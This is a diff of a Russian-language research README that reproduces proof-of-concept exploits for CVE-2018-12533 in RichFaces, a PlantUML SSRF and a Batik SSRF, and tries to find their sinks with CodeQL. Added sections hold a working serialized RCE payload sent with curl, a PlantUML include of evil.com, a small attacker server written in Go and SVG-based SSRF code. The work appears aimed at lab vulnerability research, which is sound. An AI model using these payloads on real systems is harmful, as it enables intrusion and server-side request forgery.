@@ -251,12 +251,36 @@ CWE-917
 
 PoC https://github.com/llamaonsecurity/CVE-2018-12533/blob/master/src/main/java/cve_2018_12533/Main.java
 
-Суть в нем следующая: запускается докер-контейнер с сервером richfaces-jboss
+Докер-контейнер не получилось запустить из-за старой версии докер-схемы в зависимости, но вручную можно проделать следующие шаги
+```
+wget http://downloads.jboss.org/richfaces/releases/3.3.X/3.3.4.Final/richfaces-examples-3.3.4.Final.zip
 
+wget https://sourceforge.net/projects/jboss/files/JBoss/JBoss-5.1.0.GA/jboss-5.1.0.GA-jdk6.zip
+
+unzip richfaces-examples-3.3.4.Final.zip
+
+unzip jboss-5.1.0.GA-jdk6.zip
+
+mv richfaces-examples-3.3.4.Final/photoalbum/dist/photoalbum-ear-3.3.4.Final.ear jboss-5.1.0.GA/server/default/deploy/
+
+./jboss-5.1.0.GA/bin/run.sh -b 0.0.0.0
 ```
-docker build -t richfaces-jboss .
-docker run -p 8081:8080 richfaces-jboss
+
+И сервер запустится. После чего запускаем программу и нам сгенерируется нужный пейлоад, например такой
 ```
+org.richfaces.renderkit.html.Paint2DResource/DATA/eAHNUs9rE0EUngRq1XqoP1BEhLqKplBm01RFqAExFQ1srTQiWA9hsnndnXZ2Zjs7m64WvXlRFMSrN0UQFET!Am9S8NI!QQTxIIggHvXNbmwx4N297GPme9!3ve!Ny69kKNHktNIB1dwPF5kPCdUgu6CXuaGhiQS9wrg0tZl5SFSqfTjWjFgAM8yw-vuNj6O!Xrwuk-Em2d7uBA0llG6S4fai0hEztgqBByFW29qrvGvCBbLDZ34IrCPAI0PtLtIYssdbYj3mCiYDd66zBL6Z9rAjtsIr5A4pZTEpvjL-MkJKEyRG38dtW0YL176KYiVBGtpCTrikBA7RYj3Q19ff1h8!-TBbJmUP9QVLksssgr91W0ZzGaDuzgR7ujmHIfsLZ1y5LdCcCX7LOp!OYit!AiVpksrcgACTUBDUg4D5N2fBhKp7nssukva9l8qk5JFSZMihnDVzQbgF8EIWa0gSriRS!4v5KgsG0X-Yd2Eqmhws4kATg7g37vr9Tz9PPsT4ELd3E7el-!Tuvdb3hY2zFmEdHLFPYqmjknyoQb5mFIvOtwM!Rt7tnrXadkkjq4!Ig6NrGlZSSAwNwDRs0pXxzdJTDFeCBwKL4tKxVqhdPJ1PZWZ4BE7eUChWHKTBi!45lz21DBWZCjFOIQO!4hiV-uGYa6LY9XvQrlUnz7Qna6emppzx24SkOOyNPOxCo7!kVxvXPn85vHYxHxYzLBuyLzfCFZ1LTZwaBALDTY1u-SseZhxnq8!Js7Fz1YnqWN3xEWagoaTBh1f!r6Z3st8r61CR
+```
+
+Данный пейлоад для примера будет создавать папку `/tmp/hacked.txt`
+
+Отправляем запрос
+```
+curl http://127.0.0.1:8080/photoalbum/a4j/s/3_3_3.Finalorg.richfaces.renderkit.html.Paint2DResource/DATA/eAHNUk1r1UAUnfegVq2L-oEiItQo-goyKSJu6gOxFX2QWukTwbp4zEtuk2knM-nkpo0W3Qmi4satIOJKUBD9Be6k4KY!QQRxIYggLvVOUlssuDebXGbOnHPuufflVzaQW3bG2JhbGSZzIoScW9AR2AWJPMFU8StCajw1OQO5KWwIxzqpiGFSoGi!X!s4!OvF6yYb7LDtvX48YZSxHTbYmzM2FeiqBGScULWttywjTGbZjlCECYi-goAN9CKiQbYnmBdLwldCx!50fx5CHA!oReaEF9kd1igzVn9N-pWMNU6yjHwfd89KXrsOTZoZDRp5lzjhklHURFcsgb2--rb9-MmHqSZrBqSvRJ5fFin8rdtFK3VMujtzehNVHMj2186k8btgpVDylnM-XmZO!gRJ8rzQlQEFmHNQPIBYhDenABMTnZc6ItJ1740mawSskSI7VLGWPii!Bl4oMwt5Lo0m6n8xXxXxVvQf5l2UimUH6zjIxFbcG3!1waefpx9RfITbu4Hb1H1-9373--zaWYdwDo64lZjvm7xqaitfJ81U!9uBH0Pvdk85bTekoeWH7N7RFQuLBeTIY8AJl3RrdKMMjKCR0IGior70nBXuBs9nCo0yBa!C14Itj1g2z6VeMgvQ0oVSoxxKCFsemiJMRnxMMz8R4QJEHEv0Rm8zVlCfN6qca!r1-b5au!b5y-GVi1WfFF8T2b7KgzR8usCsQAKCoCENb1qrdzLLyuVn7OnIubGTYyNtLyQYwoTRSDvX!l8a98rfWVxP3w__.jsf
+```
+
+И видим файл на запущенном сервере.
+
+![](README/poc3_screen1.png)
 
 Нету исходников со старым кодом, единственное что нашлось https://github.com/nuxeo/richfaces-3.3 опять не собирается база codeql. Из-за этого не могу найти sink и паблик метод.
 
@@ -268,13 +292,56 @@ Package: PlantUML
 
 Данная уязвимость опасна тем что позволяет перенаправлять запросы на другие сайты (например злоумышленника)
 
-PoC находится здесь https://github.com/horizon3ai/CVE-2023-34362 и заключается в том чтобы запустить PlantUML с параметром `PLANTUML_SECURITY_PROFILE=ALLOWLIST` и установить url `-Dplantuml.allowlist.url=https://plantuml.com`, тогда следующая диаграмма будет перенаправлять запросы не на `https://plantuml.com` а на `https://evil.com`
+PoC находится здесь https://github.com/zixing131/docs/blob/823060e698a8f8609bb4b3d22cc167cc9db2a19a/%E5%A5%87%E5%AE%89%E4%BF%A1%E6%94%BB%E9%98%B2%E7%A4%BE%E5%8C%BA/%E5%A5%87%E5%AE%89%E4%BF%A1%E6%94%BB%E9%98%B2%E7%A4%BE%E5%8C%BA-Web%E5%AE%9E%E6%88%98-%E6%B5%85%E8%B0%88PlantUML%E5%9B%9E%E6%98%BESSRF%E6%BC%8F%E6%B4%9E-CVE-2023-3432/%E5%A5%87%E5%AE%89%E4%BF%A1%E6%94%BB%E9%98%B2%E7%A4%BE%E5%8C%BA-Web%E5%AE%9E%E6%88%98-%E6%B5%85%E8%B0%88PlantUML%E5%9B%9E%E6%98%BESSRF%E6%BC%8F%E6%B4%9E-CVE-2023-3432.md и заключается в том чтобы запустить PlantUML с параметром `PLANTUML_SECURITY_PROFILE=ALLOWLIST` и установить url `-Dplantuml.allowlist.url=https://plantuml.com`, тогда следующая диаграмма будет перенаправлять запросы не на `https://plantuml.com` а на `https://evil.com`
 ```
 @startuml
 !include https://plantuml.com@evil.com
 a -> b: %load_json()
 @enduml
 ```
+
+Нужно сделать следующие шаги для воспроизведения
+```
+docker pull plantuml/plantuml-server:tomcat-v1.2023.8
+
+docker run -d -p 8080:8080 plantuml/plantuml-server:tomcat-v1.2023.8
+```
+
+Вторая команда запустит сервер в докере на порту 8080. Дополнительно я написал простейший http-сервер на Go, который отдает строчку `hacked!!!`
+```
+package main
+
+import (
+    "net/http"
+)
+
+func hello(w http.ResponseWriter, req *http.Request) {
+    w.Write([]byte("hacked!!!"))
+}
+
+func main() {
+    http.HandleFunc("/", hello)
+    http.ListenAndServe("10.255.255.254:8081", nil)
+}
+```
+Айпишник нужно вставить свой, из вывода команды `ip a`.
+
+Запускаем сервер (через `go run main.go`), в графическом интерфейсе вставляем например следующее
+```
+@startuml
+!include http://10.255.255.254:8081/
+Alice -> Bob: Message
+@enduml
+```
+
+![](README/poc4_screen2.png)
+
+И видим результат
+
+![](README/poc4_screen1.png)
+т.е. в конце он вставил ответ от сервера `hacked!!!`
+
+
 
 Sink https://github.com/plantuml/plantuml/blob/v1.2023.8/src/net/sourceforge/plantuml/security/SURL.java#L253 т.е. метод `java.util.regex.Pattern:compile`
 
@@ -292,7 +359,7 @@ Package: org.apache.xmlgraphics:batik-xml
 
 PoC находится здесь https://psytester.github.io/Jira_SSRF_at_Batik_CVEs_PoC/
 
-Его суть в том чтобы стриггерить Server-Side-Request-Forgery через SVG-теги `<image>, <tref>, <use>`:
+Его суть в том чтобы стриггерить Server-Side-Request-Forgery через SVG-теги `<image>, <use>, <tref>` используя `xlink:href`
 ```
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="450" height="500" viewBox="0 0 450 500">
 	<text x="100" y="100" font-size="45" fill="blue" >
@@ -301,6 +368,70 @@ PoC находится здесь https://psytester.github.io/Jira_SSRF_at_Batik
     	<image width="50" height="50" xlink:href="jar:http://127.0.0.1:8067/some-internal-resource?poc_triggered_tag=image!/"></image>
 </svg>
 ```
+
+По ссылке по большей части описание, для воспроизведения сделаем следующие шаги.
+
+1. Запустим python-сервер куда будут уходить запросы через команду `python3 -m http.server`
+2. Теперь можно запустить саму программу с PoC (лежит в папке `batik-cve`), продублирую тут код:
+```
+import java.awt.Rectangle;
+import java.awt.Graphics2D;
+import java.awt.Color;
+import java.io.ByteArrayInputStream;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+
+import org.apache.batik.transcoder.TranscoderInput;
+import org.apache.batik.transcoder.TranscoderOutput;
+import org.apache.batik.transcoder.image.PNGTranscoder;
+
+public class TestSVGGen {
+
+  public void paint(Graphics2D g2d) {
+    g2d.setPaint(Color.red);
+    g2d.fill(new Rectangle(10, 10, 100, 100));
+  }
+
+  public static void main(String[] args) throws IOException {
+    String svg = """
+            <svg xmlns="http://www.w3.org/2000/svg"
+                 xmlns:xlink="http://www.w3.org/1999/xlink"
+                 width="450" height="500" viewBox="0 0 450 500">
+                <text x="100" y="100" font-size="45" fill="blue">
+                    image xlink:href SSRF attack
+                </text>
+                <use width="50" height="50"
+                       xlink:href="http://127.0.0.1:8080/"/>
+            </svg>
+        """;
+
+    InputStream svgInputStream = new ByteArrayInputStream(svg.getBytes("UTF-8"));
+    TranscoderInput input = new TranscoderInput(svgInputStream);
+
+    OutputStream pngOutputStream = new FileOutputStream("output.png");
+    TranscoderOutput output = new TranscoderOutput(pngOutputStream);
+
+    PNGTranscoder transcoder = new PNGTranscoder();
+    try {
+      transcoder.transcode(input, output);
+    } catch (Exception e) {
+    }
+
+    pngOutputStream.flush();
+    pngOutputStream.close();
+  }
+}
+```
+
+Т.е. мы преобразуем svg в png, и batik делает запрос на наш сервер `http://localhost:8080`
+
+![](README/poc5_screen1.png)
+
+![](README/poc5_screen2.png)
+
+На втором скрине видно, что запрос пришел
 
 Я создал базу на версии `batik-1.16` и запустил через codeql, но оно не находит уязвимости.
 
